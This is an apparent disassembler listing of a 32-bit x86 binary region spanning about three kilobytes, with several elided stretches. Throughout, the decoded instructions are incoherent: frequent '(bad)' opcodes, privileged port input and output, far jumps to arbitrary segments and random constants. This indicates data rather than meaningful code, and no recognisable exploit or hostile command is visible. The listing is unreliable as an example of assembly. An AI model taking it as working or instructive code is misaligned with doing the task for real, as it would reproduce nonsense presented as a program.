  423451:	cmp    BYTE PTR [esi-0xc3d1ea5],dh
  423457:	idiv   DWORD PTR [eax-0x6b2c5477]
  42345d:	cmp    eax,0x8d28b8ae
  423462:	rep stos DWORD PTR es:[edi],eax
  423464:	enter  0xe0ca,0xe2
  423468:	jge    0x423485
  42346a:	adc    al,0x2e
  42346c:	dec    edx
  42346d:	xchg   ecx,eax
  42346e:	mov    ds:0x5bc36c94,eax
  423473:	add    al,0x6
  423475:	inc    ecx
  423476:	rol    DWORD PTR [ecx+0x2f],cl
  423479:	lods   eax,DWORD PTR ds:[esi]
  42347a:	inc    ecx
  42347b:	pusha  
  42347c:	dec    eax
  42347d:	int3   
  42347e:	stos   DWORD PTR es:[edi],eax
  42347f:	out    0xeb,al
  423481:	xchg   DWORD PTR [eax+0x24],ecx
  423484:	scas   al,BYTE PTR es:[edi]
  423485:	shl    BYTE PTR [esi-0x21],cl
  423488:	pop    eax
  423489:	cmp    DWORD PTR [eax+ebp*1],ecx
  42348c:	mov    al,0x65
  42348e:	and    eax,0x227abf19
  423493:	repz pop esp
  423495:	out    dx,eax
  423496:	iret   
  423497:	pop    edi
  423498:	xchg   edi,eax
  423499:	stos   BYTE PTR es:[edi],al
  42349a:	outs   dx,DWORD PTR ds:[esi]
  42349b:	repnz mov ebp,0x80f801c3
  4234a1:	(bad)  
  4234a3:	call   FWORD PTR [edi+0x56]
  4234a6:	loope  0x423501
  4234a8:	mov    edi,0xdaadf253
  4234ad:	scas   al,BYTE PTR es:[edi]
  4234ae:	or     eax,0xac56f103
  4234b3:	pop    ebx
  4234b4:	dec    ecx
  4234b5:	fcmovu st,st(1)
  4234b7:	js     0x4234da
  4234b9:	add    eax,0xc36fd452
  4234be:	into   
  4234bf:	pop    esp
  4234c0:	stos   DWORD PTR es:[edi],eax
  4234c1:	push   ebx
	...
  423532:	add    BYTE PTR [eax],al
  423534:	call   0xfa77:0xbf778fae
  42353b:	out    dx,eax
  42353c:	dec    ebx
  42353d:	jg     0x4234d2
  42353f:	aad    0x89
  423541:	sti    
  423542:	std    
  423543:	inc    esp
  423544:	mov    BYTE PTR [ecx+0x1],bh
  423547:	add    dh,dh
  423549:	add    BYTE PTR [eax],al
  42354b:	add    dl,dh
  42354d:	(bad)  
  42354e:	xor    cl,dl
  423550:	push   ss
  423551:	adc    al,0x9c
  423553:	je     0x42355b
  423555:	lea    eax,[esi-0x5976e74d]
  42355b:	dec    edx
  42355c:	mov    BYTE PTR [eax+0x2d0e680c],dl
  423562:	(bad)  
  423564:	js     0x4235c6
  423566:	xchg   ebp,eax
  423567:	ret    0xc453
  42356a:	push   0xb75dde14
  42356f:	hlt    
  423570:	nop
  423571:	or     eax,0x86de61e4
  423576:	js     0x42355e
  423578:	jp     0x4235a3
  42357a:	std    
  42357b:	test   al,0xfe
  42357d:	cmp    eax,0xa8b17d7f
  423582:	mov    ds:0x5b0f2baa,al
  423587:	ins    DWORD PTR es:[edi],dx
  423588:	mov    al,BYTE PTR [ebp-0x1f]
  42358b:	js     0x423514
  42358d:	popf   
  42358e:	xchg   cl,cl
  423590:	mov    edi,0x66ff3c69
  423595:	sahf   
  423596:	mov    ebx,0x11e08a86
  42359b:	jl     0x4235a3
  42359d:	pop    edx
  42359e:	(bad)  
  42359f:	fld    TBYTE PTR [ecx]
  4235a1:	ins    BYTE PTR es:[edi],dx
  4235a2:	(bad)  
  4235a4:	add    BYTE PTR [esi],al
  4235a6:	addr16 mov ds:0x2e31,eax
  4235aa:	mov    ds:0xf34243bf,al
  4235af:	or     BYTE PTR [esi],al
  4235b1:	or     bh,al
  4235b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4235b4:	enter  0x281b,0xca
  4235b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4235b9:	in     al,dx
  4235ba:	xor    al,0xdb
  4235bc:	push   ebx
  4235bd:	xor    al,0x98
  4235bf:	leave  
  4235c0:	dec    edx
  4235c1:	add    eax,edx
  4235c3:	cmp    ebp,DWORD PTR [ebx+0x30]
  4235c6:	test   BYTE PTR [edi+0x12a2c8e3],0xf4
  4235cd:	inc    esi
  4235ce:	loope  0x4235fb
  4235d0:	aas    
  4235d1:	dec    ebx
  4235d2:	(bad)  
  4235d3:	xor    eax,0xb2bfaee4
  4235d8:	stc    
  4235d9:	sub    DWORD PTR [ecx+0x30564e6c],eax
  4235df:	and    dh,al
  4235e1:	ret    
  4235e2:	sub    dl,BYTE PTR [ebp+0x2e0a02cc]
  4235e8:	jp     0x4235cf
  4235ea:	sub    BYTE PTR [esi],dl
  4235ec:	std    
  4235ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4235ee:	sbb    eax,0x1f2ab94f
  4235f3:	xor    ch,BYTE PTR [edi]
  4235f5:	dec    eax
  4235f6:	jae    0x42361a
  4235f8:	ficom  WORD PTR [edx-0x2ee02146]
  4235fe:	outs   dx,DWORD PTR ds:[esi]
  4235ff:	fsubrp st(0),st
  423601:	and    al,0xd1
  423603:	shl    DWORD PTR [esi+ebp*1-0x6055449b],0x2c
  42360b:	out    dx,al
  42360c:	out    0x3a,al
  42360e:	scas   al,BYTE PTR es:[edi]
  42360f:	(bad)  
  423610:	sub    eax,eax
  423612:	adc    BYTE PTR [esi+0x71],ch
  423615:	xchg   dl,dl
  423617:	rcl    BYTE PTR cs:[ecx+edx*4],1
  42361b:	xchg   ebp,eax
  42361c:	imul   edi,ebx,0xffffffc0
  42361f:	out    dx,al
  423620:	and    ch,dh
  423622:	inc    edi
  423623:	pop    es
  423624:	xor    eax,0xe2314bc0
  423629:	cmp    DWORD PTR [esi+edi*8+0x421c117d],eax
  423630:	fist   WORD PTR [edi-0x4d]
  423633:	mov    cl,0xc5
  423636:	clc    
  423637:	push   ebp
  423638:	xchg   esi,eax
  423639:	call   0x4151:0xae1e08af
  423640:	xchg   ecx,eax
  423641:	int3   
	...
  4236b2:	add    BYTE PTR [eax],al
  4236b4:	daa    
  4236b5:	sub    eax,0x7d7f2d7d
  4236ba:	ja     0x4236eb
  4236bc:	mov    cl,ah
  4236be:	paddq  mm3,mm6
  4236c1:	adc    esi,DWORD PTR [ebp-0x7c]
  4236c4:	jle    0x423740
  4236c6:	add    DWORD PTR [eax],eax
  4236c8:	test   BYTE PTR [eax],0x0
  4236cb:	add    BYTE PTR [ebx+0x8],bh
  4236ce:	rcr    dl,0xd
  4236d1:	xchg   edx,eax
  4236d2:	dec    ecx
  4236d3:	or     ch,dl
  4236d5:	or     eax,esi
  4236d7:	ret    
  4236d8:	pop    esi
  4236d9:	xchg   esp,eax
  4236da:	push   cs
  4236db:	ins    BYTE PTR es:[edi],dx
  4236dc:	or     esi,ecx
  4236de:	inc    edx
  4236df:	call   0x7bccf41e
  4236e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4236e5:	wbinvd 
  4236e7:	or     eax,0x77b6fda9
  4236ec:	pop    esp
  4236ed:	cmp    eax,0x5beb8f93
  4236f2:	arpl   WORD PTR [ebx+0x5cace35],di
  4236f8:	hlt    
  4236f9:	add    dl,BYTE PTR [ebx]
  4236fb:	fcomp  QWORD PTR gs:[edx-0x304e564]
  423702:	mov    DWORD PTR [ebx+0x2e],ebx
  423705:	and    esp,ecx
  423707:	add    ebx,ecx
  423709:	mov    eax,ds:0x7befba9a
  42370e:	mov    eax,0x735add7e
  423713:	mov    ecx,0xa1e718a8
  423718:	push   ecx
  423719:	int    0x72
  42371b:	fild   WORD PTR [edx+0x1b451f19]
  423721:	outs   dx,DWORD PTR ds:[esi]
  423722:	ror    BYTE PTR [ebp+ebx*4-0x66],0xc1
  423727:	fwait
  423728:	mov    dl,0x6
  42372a:	ja     0x423705
  42372c:	adc    cl,BYTE PTR [ebx-0x66]
  42372f:	sub    eax,0xecaeb937
  423734:	cmovb  ecx,esp
  423737:	ins    BYTE PTR es:[edi],dx
  423738:	xor    BYTE PTR [edx-0x10fcf4a6],dl
  42373e:	mov    edx,0xd9a6d210
  423743:	pushf  
  423744:	icebp  
  423745:	xor    eax,0x7225574d
  42374a:	jo     0x423773
  42374c:	xchg   DWORD PTR ds:0x3a8c937c,eax
  423752:	ins    DWORD PTR es:[edi],dx
  423753:	mov    ebp,0x56e034b9
  423758:	xor    eax,0xd46a41ad
  42375d:	mov    eax,ds:0xa48a0302
  423762:	fdivr  QWORD PTR [ebx+edx*1-0x40093f25]
  423769:	and    edi,eax
  42376b:	popa   
  42376c:	inc    esp
  42376d:	jl     0x423796
  42376f:	ret    0x3530
  423772:	fcomip st,st(0)
  423774:	in     al,0x9b
  423776:	test   al,0xec
  423778:	arpl   WORD PTR ds:0xd6394180,si
  42377e:	or     eax,0x57e50019
  423783:	push   eax
  423784:	or     al,0xa4
  423786:	push   esp
  423787:	pop    es
  423788:	test   edi,0x596f7a18
  42378e:	and    esi,DWORD PTR [esi-0x44458671]
  423794:	sub    ecx,0x13
  423797:	into   
  423798:	mov    esi,0x7076cd6f
  42379d:	out    0x98,eax
  42379f:	and    al,ah
  4237a1:	retf   0x1381
  4237a4:	out    0x12,eax
  4237a6:	mov    edx,0xe50e969b
  4237ab:	jp     0x423809
  4237ad:	xor    dh,ah
  4237af:	pop    ebx
  4237b0:	outs   dx,BYTE PTR ds:[esi]
  4237b1:	in     eax,dx
  4237b2:	sbb    DWORD PTR [ecx*8-0xdaa074c],ebp
  4237b9:	push   edx
  4237ba:	daa    
  4237bb:	repz (bad) 
  4237bd:	scas   al,BYTE PTR es:[edi]
  4237be:	aam    0x46
  4237c0:	test   al,0x7d
	...
  423832:	add    BYTE PTR [eax],al
  423834:	int    0x39
  423836:	mov    eax,0xef97fc97
  42383b:	jnp    0x423814
  42383d:	jge    0x4238a4
  42383f:	xchg   ecx,eax
  423840:	neg    cl
  423842:	rcr    DWORD PTR [edi+0x74],cl
  423845:	jnp    0x423848
  423847:	add    dh,dh
  423849:	add    BYTE PTR [eax],al
  42384b:	add    ah,dl
  42384d:	mov    dl,0x78
  42384f:	(bad)  
  423851:	data16 and ch,0xef
  423855:	lahf   
  423856:	out    0x90,al
  423858:	or     DWORD PTR [ebx-0x58f2fbf4],ebp
  42385e:	mov    al,ds:0xd2a12175
  423863:	and    eax,0xae123960
  423868:	sbb    BYTE PTR [eax+ecx*8],dh
  42386b:	sbb    BYTE PTR [ecx-0x75cb7871],0x16
  423872:	or     al,0xb0
  423874:	pop    ecx
  423875:	stc    
  423876:	sub    DWORD PTR [eax+eax*1],edi
  423879:	sub    eax,DWORD PTR [ebx-0x7d]
  42387c:	push   eax
  42387d:	lea    ecx,[esi]
  42387f:	fisttp WORD PTR [esi-0x6d]
  423882:	xchg   esp,eax
  423883:	aam    0xe3
  423885:	rcl    BYTE PTR [esi],0x97
  423888:	push   esi
  423889:	xor    al,0x8e
  42388b:	nop
  42388c:	sbb    cl,BYTE PTR [edx-0x44]
  42388f:	or     bh,BYTE PTR [edi-0x10]
  423892:	xor    cl,0xf9
  423895:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423896:	(bad)
  423899:	loop   0x4238da
  42389b:	and    BYTE PTR [ecx-0x41],0x7c
  42389f:	(bad)  
  4238a1:	lods   al,BYTE PTR ds:[esi]
  4238a2:	mov    ebx,gs
  4238a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4238a5:	and    al,0x97
  4238a7:	pop    ds
  4238a8:	loop   0x423919
  4238aa:	lea    edi,[esi+0x2704088e]
  4238b0:	push   0x56
  4238b2:	lahf   
  4238b3:	popf   
  4238b4:	sub    DWORD PTR [eax-0x5],eax
  4238b7:	lods   al,BYTE PTR ds:[esi]
  4238b8:	sbb    edi,0x7aca3e30
  4238be:	(bad)  
  4238bf:	std    
  4238c0:	mov    fs,WORD PTR [esi+0x25]
  4238c3:	jmp    0x5aed3351
  4238c8:	mov    al,ds:0xccb99717
  4238cd:	retf   0xa3a1
  4238d0:	mov    ebp,0x4b9e866c
  4238d5:	daa    
  4238d6:	add    cl,BYTE PTR [esi-0x2505fed]
  4238dc:	js     0x4238f4
  4238de:	cld    
  4238df:	add    dl,al
  4238e1:	fadd   QWORD PTR [esi-0x79faa441]
  4238e7:	sbb    dl,BYTE PTR [ebx+0x175e5d98]
  4238ed:	je     0x42391c
  4238ef:	xchg   edi,eax
  4238f0:	aam    0xa3
  4238f2:	nop
  4238f3:	vpmacssdd xmm4,xmm7,xmm1,XMMWORD PTR [edi]
  4238f9:	mov    ds:0x3abb866d,al
  4238fe:	cmp    eax,DWORD PTR [ecx-0x14516a92]
  423904:	fsub   st,st(7)
  423906:	int    0xfb
  423908:	int    0xa1
  42390a:	pushf  
  42390b:	retf   0xf265
  42390e:	inc    eax
  42390f:	dec    edx
  423910:	into   
  423911:	loop   0x4238b4
  423913:	shl    BYTE PTR [edi+0x657a24eb],0x5b
  42391a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42391b:	sti    
  42391c:	cmp    BYTE PTR [ecx+0x3c44d66d],0x8a
  423923:	fidivr WORD PTR [edx+0x61]
  423926:	jp     0x423962
  423928:	fwait
  423929:	out    0x2f,al
  42392b:	cmp    esi,DWORD PTR [ecx-0x2a3f905b]
  423931:	scas   al,BYTE PTR es:[edi]
  423932:	js     0x42397a
  423934:	push   0x6d
  423936:	loop   0x423954
  423938:	adc    al,0xc
  42393a:	es repnz push es
  42393d:	dec    ecx
  42393e:	and    BYTE PTR [edx],0xfd
  423941:	jecxz  0x423943
	...
  4239b3:	add    BYTE PTR [esi-0x377e796],dl
  4239b9:	cli    
  4239ba:	xchg   esi,eax
  4239bb:	jle    0x4239aa
  4239bd:	mov    cl,0x66
  4239bf:	mov    WORD PTR [eax],?
  4239c1:	out    0xc7,eax
  4239c3:	lahf   
  4239c4:	push   0x7c
  4239c6:	add    DWORD PTR [eax],eax
  4239c8:	test   BYTE PTR [eax],0x0
  4239cb:	add    BYTE PTR [eax],cl
  4239cd:	xlat   BYTE PTR ds:[ebx]
  4239ce:	sti    
  4239cf:	rol    DWORD PTR [ecx+0x5],cl
  4239d2:	pop    edi
  4239d3:	shl    BYTE PTR [ecx+esi*2+0x68],0x23
  4239d8:	in     al,0xd1
  4239da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4239db:	push   edi
  4239dc:	sbb    DWORD PTR [ebp-0x2c],ecx
  4239df:	xor    al,BYTE PTR [esi-0x1]
  4239e2:	int    0xcc
  4239e4:	test   al,0x7a
  4239e6:	pop    ss
  4239e7:	in     eax,0x45
  4239e9:	push   es
  4239ea:	into   
  4239eb:	xchg   ecx,eax
  4239ec:	mov    cl,0xf
  4239ee:	add    ebp,DWORD PTR [esi-0x402b8107]
  4239f4:	sub    al,0xa7
  4239f6:	push   cs
  4239f7:	in     al,dx
  4239f8:	adc    eax,0xe20df3bf
  4239fd:	xor    cl,bl
  4239ff:	test   eax,0xafef6ea
  423a04:	mov    ecx,0x9c12e90d
  423a09:	loope  0x4239f7
  423a0b:	sub    al,al
  423a0d:	lea    esp,[esi]
  423a0f:	xchg   ecx,eax
  423a10:	and    al,0xa3
  423a12:	rcl    DWORD PTR [edi-0x45079bf7],cl
  423a18:	xor    cl,al
  423a1a:	dec    ebp
  423a1b:	xchg   edx,eax
  423a1c:	sub    esi,DWORD PTR [ebp+0x28ae8219]
  423a22:	pop    edi
  423a23:	and    BYTE PTR [ecx-0x12],0x83
  423a27:	cmp    edx,esp
  423a29:	pop    esp
  423a2a:	mov    esi,0x7c051642
  423a2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423a30:	nop
  423a31:	xlat   BYTE PTR ds:[ebx]
  423a32:	scas   eax,DWORD PTR es:[edi]
  423a33:	xchg   ebp,eax
  423a34:	jb     0x423a7b
  423a36:	cmp    ebp,edi
  423a38:	xchg   ecx,eax
  423a39:	stos   DWORD PTR es:[edi],eax
  423a3a:	or     eax,0xc2ef15a3
  423a3f:	pop    es
  423a40:	mov    ch,0xe1
  423a42:	int3   
  423a43:	popa   
  423a44:	sar    BYTE PTR [esi+0x6f7dc565],cl
  423a4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423a4b:	(bad)  
  423a4c:	clc    
  423a4d:	repz xor ch,BYTE PTR ds:0xae297d1a
  423a54:	push   esi
  423a55:	outs   dx,DWORD PTR ds:[esi]
  423a56:	cmp    eax,0x752e525
  423a5b:	and    esp,0x44
  423a5e:	data16 shl BYTE PTR [ebx+ebp*4-0x7ae918a5],cl
  423a66:	jle    0x423a26
  423a68:	test   al,0xb2
  423a6a:	int3   
  423a6b:	pop    eax
  423a6c:	aas    
  423a6d:	pop    es
  423a6e:	mov    ch,0xe5
  423a70:	sbb    DWORD PTR [edx-0x4f],0xb65b182c
  423a77:	inc    edx
  423a78:	mov    esp,0x7d554866
  423a7d:	dec    esi
  423a7e:	xchg   ebp,eax
  423a7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423a80:	(bad)  
  423a82:	sti    
  423a83:	sub    BYTE PTR [ecx],cl
  423a85:	sub    DWORD PTR [eax],eax
  423a87:	hlt    
  423a88:	adc    bl,BYTE PTR ds:0x211c077b
  423a8e:	popa   
  423a8f:	push   edx
  423a90:	jo     0x423a39
  423a92:	mov    esp,DWORD PTR [edx-0x7c]
  423a95:	int    0x4
  423a97:	or     DWORD PTR [ebp-0x606ea193],0x7a5d9f6f
  423aa1:	jmp    0x68a48690
  423aa6:	push   ebp
  423aa7:	sub    al,al
  423aa9:	cmp    eax,0x1d452b2e
  423aae:	pusha  
  423aaf:	aaa    
  423ab0:	and    dh,BYTE PTR [ebx]
  423ab2:	push   0x47dea5d
  423ab7:	lods   al,BYTE PTR ds:[esi]
  423ab8:	rcl    esi,cl
  423aba:	mov    edx,DWORD PTR [esi+0x7bf6ada8]
  423ac0:	into   
  423ac1:	adc    al,BYTE PTR [eax]
	...
  423b33:	add    BYTE PTR [edi+esi*1+0x4a],al
  423b37:	fwait
  423b38:	jnp    0x423b39
  423b3a:	aad    0xff
  423b3c:	gs popa 
  423b3e:	into   
  423b3f:	add    al,0x13
  423b41:	or     DWORD PTR [ebp-0x2e],ecx
  423b44:	pusha  
  423b45:	jge    0x423b48
  423b47:	add    dh,dh
  423b49:	add    BYTE PTR [eax],al
  423b4b:	add    BYTE PTR [edi+ebx*4],ch
  423b4e:	aam    0xaa
  423b50:	mov    ebp,0xf06a2de7
  423b55:	push   eax
  423b56:	js     0x423b54
  423b58:	push   edi
  423b59:	cwde   
  423b5a:	sub    BYTE PTR [ebx+0x7],0x1e
  423b5e:	(bad)  
  423b5f:	rcr    ah,1
  423b61:	out    0xed,eax
  423b63:	inc    edx
  423b64:	xchg   bh,cl
  423b66:	fisubr WORD PTR [ebx]
  423b68:	aaa    
  423b69:	leave  
  423b6a:	jns    0x423b5a
  423b6c:	and    eax,0xeddd3851
  423b71:	jne    0x423b89
  423b73:	nop
  423b74:	bound  esp,QWORD PTR [ebp-0x4fd30c77]
  423b7a:	aaa    
  423b7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423b7c:	jns    0x423b1c
  423b7e:	dec    ebx
  423b7f:	iret   
  423b80:	idiv   BYTE PTR [ebx+0x1792efb6]
  423b86:	push   ss
  423b87:	imul   eax,eax,0x12
  423b8a:	push   ecx
  423b8b:	jbe    0x423b70
  423b8d:	sbb    esi,DWORD PTR [edx]
  423b8f:	xchg   ebx,eax
  423b90:	jno    0x423b1a
  423b92:	cmp    BYTE PTR [ecx],bh
  423b94:	add    al,0xcf
  423b96:	(bad)  
  423b97:	in     eax,0xe3
  423b99:	mov    ebx,DWORD PTR [ebp-0x1]
  423b9c:	pusha  
  423b9d:	lods   al,BYTE PTR ds:[esi]
  423b9e:	scas   eax,DWORD PTR es:[edi]
  423b9f:	(bad)  
  423ba0:	call   0x8a2251a8
  423ba5:	xor    eax,DWORD PTR [eax-0x214a5d28]
  423bab:	repnz test esi,eax
  423bae:	dec    edi
  423baf:	fisubr WORD PTR ds:0x5033ade8
  423bb5:	pop    edi
  423bb6:	dec    edi
  423bb7:	mov    edx,0xced0c07d
  423bbc:	sbb    al,0xfb
  423bbe:	stos   DWORD PTR es:[edi],eax
  423bbf:	mov    ds:0x88449398,eax
  423bc4:	and    edi,ebp
  423bc6:	callw  0xb935
  423bca:	jmp    0x768:0x937b98e9
  423bd1:	dec    ebx
  423bd2:	jle    0x423ba4
  423bd4:	ja     0x423c05
  423bd6:	mov    esp,0xcc15f48a
  423bdb:	je     0x423c47
  423bdd:	xor    BYTE PTR [ebx-0x39],al
  423be0:	pop    es
  423be1:	(bad)  
  423be2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423be3:	add    dh,BYTE PTR [eax+0x4e7d9a2]
  423be9:	push   esi
  423bea:	sub    eax,0xfc842e1f
  423bef:	jae    0x423c6e
  423bf1:	fnsave [ecx]
  423bf3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423bf4:	jns    0x423c04
  423bf6:	add    eax,0xea7815ea
  423bfb:	jecxz  0x423bb8
  423bfd:	sub    dh,ah
  423bff:	sub    ecx,edx
  423c01:	mul    BYTE PTR [ebx]
  423c03:	jle    0x423c3e
  423c05:	cmc    
  423c06:	outs   dx,BYTE PTR ds:[esi]
  423c07:	imul   DWORD PTR [esi+esi*2-0x5eb66cf8]
  423c0e:	push   edx
  423c0f:	mov    dh,0xf5
  423c11:	xchg   ebp,eax
  423c12:	mov    ebp,0x3814f337
  423c17:	cli    
  423c18:	pop    ecx
  423c19:	cmp    DWORD PTR [edi-0x61cfccc],esp
  423c1f:	pop    ss
  423c20:	in     eax,dx
  423c21:	stos   BYTE PTR es:[edi],al
  423c22:	aad    0x57
  423c24:	xchg   edi,eax
  423c25:	mov    eax,0x8b7db906
  423c2a:	sub    dl,BYTE PTR [edi]
  423c2c:	push   cs
  423c2d:	stc    
  423c2e:	enter  0x1139,0x46
  423c32:	inc    ebp
  423c33:	pop    eax
  423c34:	js     0x423be4
  423c36:	jae    0x423bdf
  423c38:	sbb    edx,DWORD PTR [ebx+0x1c4a6bc7]
  423c3e:	adc    eax,0xf98f75
	...
  423cb3:	add    BYTE PTR [edi+0x626d60bd],bh
  423cb9:	std    
  423cba:	mov    edi,0x703576ff
  423cbf:	enter  0x1245,0xb4
  423cc3:	js     0x423d1b
  423cc5:	jle    0x423cc8
  423cc7:	add    dh,dh
  423cc9:	add    BYTE PTR [eax],al
  423ccb:	add    BYTE PTR [edi+0x1b],ch
  423cce:	mov    bl,0x3d
  423cd0:	xor    eax,0xe6c37abc
  423cd5:	call   0x78e6c5df
  423cda:	jp     0x423c5e
  423cdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423cdd:	jns    0x423d30
  423cdf:	iret   
  423ce0:	inc    esp
  423ce1:	imul   edi,DWORD PTR [edx-0x78],0xcb3e8df7
  423ce8:	fcmovne st,st(7)
  423cea:	in     eax,dx
  423ceb:	sbb    DWORD PTR [esi-0x4f],0x75391dd2
  423cf2:	jle    0x423cb5
  423cf4:	bound  ecx,QWORD PTR [esi+0x2f]
  423cf7:	push   ds
  423cf8:	dec    edi
  423cf9:	mov    bl,0x1a
  423cfb:	mov    cs,ecx
  423cfd:	lods   eax,DWORD PTR ds:[esi]
  423cfe:	out    dx,eax
  423cff:	mov    dl,0xfc
  423d01:	imul   ecx
  423d03:	mov    bh,BYTE PTR [ebp+0x6a538556]
  423d09:	adc    BYTE PTR [esi+0x66],bh
  423d0c:	dec    esi
  423d0d:	fisttp WORD PTR [ebp+0x24b568d7]
  423d13:	push   ecx
  423d14:	call   0xc39f:0x9bbb066a
  423d1b:	leave  
  423d1c:	cmp    eax,0x2f21fa8c
  423d21:	dec    ebx
  423d22:	adc    BYTE PTR [ebx+0x3e],bh
  423d25:	pop    eax
  423d26:	aas    
  423d27:	jno    0x423d0b
  423d29:	xchg   edx,eax
  423d2a:	neg    DWORD PTR [edx+esi*2]
  423d2d:	sbb    al,0xa9
  423d2f:	mov    al,0xcc
  423d31:	mov    al,0xdc
  423d33:	daa    
  423d34:	neg    DWORD PTR ds:0x3f5b2f9
  423d3a:	mov    eax,ds:0xbaa1a41d
  423d3f:	inc    esp
  423d40:	and    ebx,DWORD PTR ds:0xe363d6f7
  423d46:	lahf   
  423d47:	rcl    BYTE PTR [ebx-0x28],1
  423d4a:	into   
  423d4b:	sbb    eax,DWORD PTR [edx+0x5]
  423d4e:	int3   
  423d4f:	jmp    0xba54:0xeeacd053
  423d56:	xchg   ebx,eax
  423d57:	sti    
  423d58:	int    0x13
  423d5a:	sub    BYTE PTR [ebx],cl
  423d5c:	test   eax,0xc234372c
  423d61:	mov    esp,ebp
  423d63:	das    
  423d64:	add    BYTE PTR [edx],bl
  423d66:	jp     0x423cfe
  423d68:	dec    eax
  423d69:	ret    
  423d6a:	or     bl,BYTE PTR [edx+edx*2+0x72]
  423d6e:	inc    ebx
  423d6f:	aad    0xc5
  423d71:	in     al,dx
  423d72:	mov    esp,0xa04b4ebe
  423d77:	out    0x70,al
  423d79:	xchg   ecx,eax
  423d7a:	xchg   edx,eax
  423d7b:	aam    0xce
  423d7d:	cmp    eax,0x70c26c5f
  423d82:	and    ebx,eax
  423d84:	in     al,dx
  423d85:	loope  0x423e06
  423d87:	lahf   
  423d88:	jle    0x423dd7
  423d8a:	pop    ds
  423d8b:	and    edi,esi
  423d8d:	ins    BYTE PTR es:[edi],dx
  423d8e:	loopne 0x423d47
  423d90:	xchg   esi,eax
  423d91:	int3   
  423d92:	mov    DWORD PTR [ebx+eax*1+0x46734d90],eax
  423d99:	mov    WORD PTR [ebp+ebx*4+0x32],ds
  423d9d:	mov    ebx,0x3b1becea
  423da2:	mov    bh,BYTE PTR [eax-0x70f8a60a]
  423da8:	shr    DWORD PTR [ebx+0x58],cl
  423dab:	sbb    dh,ah
  423dad:	and    eax,DWORD PTR [esi+ecx*4]
  423db0:	push   es
  423db1:	rcl    DWORD PTR ds:[ebp+edx*8+0x19],1
  423db6:	mov    bh,0x57
  423db8:	loope  0x423d4f
  423dba:	pushw  cs
  423dbc:	lds    ebp,FWORD PTR [edi]
  423dbe:	mov    eax,ds:0xe2486b
	...
  423e33:	add    BYTE PTR [ebx-0x21e677ab],al
  423e39:	fst    QWORD PTR [ebx+0x6b48c6df]
  423e3f:	out    dx,eax
  423e40:	mul    BYTE PTR [eax]
  423e42:	rcr    bh,cl
  423e44:	dec    esp
  423e45:	jg     0x423e48
  423e47:	add    dh,dh
  423e49:	add    BYTE PTR [eax],al
  423e4b:	add    BYTE PTR [edx+ebp*4-0x31],ah
  423e4f:	pop    es
  423e50:	fisubr DWORD PTR [edx+0x19]
  423e53:	(bad)  [edx]
  423e55:	enter  0xf96e,0xde
  423e59:	cdq    
  423e5a:	push   ebx
  423e5b:	add    ch,BYTE PTR [ebx+ecx*2+0x30]
  423e5f:	jle    0x423ea9
  423e61:	bound  esi,QWORD PTR [ecx]
  423e63:	and    DWORD PTR [ebx-0x18],esp
  423e66:	adc    ecx,DWORD PTR [ebp-0x4e]
  423e69:	or     ch,BYTE PTR [ebp+0x8c04881]
  423e6f:	cld    
  423e70:	xor    DWORD PTR ds:0xeca4a6f0,edi
  423e76:	cmp    BYTE PTR [ecx-0x2be7fddd],bl
  423e7c:	mov    eax,0x46be09cc
  423e81:	call   0xfdddb43a
  423e86:	sbb    eax,0x7503e745
  423e8b:	outs   dx,DWORD PTR ds:[esi]
  423e8c:	sbb    BYTE PTR [ebp+0x351d8e73],dl
  423e92:	xor    BYTE PTR [ecx-0x7f],ah
  423e95:	ds call 0xf97:0x92172d5a
  423e9d:	sbb    ebp,DWORD PTR [edi]
  423e9f:	mov    ch,0xc1
  423ea1:	stc    
  423ea2:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  423ea4:	repz mov dl,0xd0
  423ea7:	mov    ds:0x3c41efeb,eax
  423eac:	jne    0x423e95
  423eae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423eaf:	jmp    0xa522:0x529d63f5
  423eb6:	sub    al,0x12
  423eb8:	mov    ah,0xe9
  423eba:	inc    esi
  423ebb:	(bad)  
  423ebd:	sub    eax,0x7cdc0353
  423ec2:	es int 0xbb
  423ec5:	jg     0x423f38
  423ec7:	or     BYTE PTR [edi-0x4f],bl
  423eca:	test   edx,esp
  423ecc:	test   eax,0xdd8249f3
  423ed1:	(bad)  
  423ed3:	adc    ah,BYTE PTR [ecx+0x6f20360]
  423ed9:	push   es
  423eda:	add    ebp,ebx
  423edc:	xchg   DWORD PTR [ecx+0x10],ebx
  423edf:	out    0x45,al
  423ee1:	sbb    edx,esp
  423ee3:	or     DWORD PTR [ebp-0x327ff99d],edx
  423ee9:	cmp    ah,BYTE PTR [eax-0x2]
  423eec:	rcl    DWORD PTR [edx+0x2c881831],1
  423ef2:	pushf  
  423ef3:	jae    0x423f52
  423ef5:	mov    esi,0xd1a108e4
  423efa:	sub    DWORD PTR [esp+ebx*8+0x35],esi
  423efe:	in     eax,dx
  423eff:	pop    edx
  423f00:	cmp    ch,BYTE PTR [ebx]
  423f02:	aam    0xe4
  423f04:	push   ecx
  423f05:	jl     0x423f43
  423f07:	data16 or al,0xe
  423f0a:	shl    DWORD PTR [edx-0x70],1
  423f0d:	cli    
  423f0e:	sbb    al,0xd7
  423f11:	xor    ah,BYTE PTR [edi]
  423f13:	js     0x423eb1
  423f15:	enter  0x4549,0xe6
  423f19:	stc    
  423f1a:	cmp    al,0x21
  423f1c:	adc    dh,BYTE PTR [esi]
  423f1e:	retf   
  423f1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423f20:	pop    ss
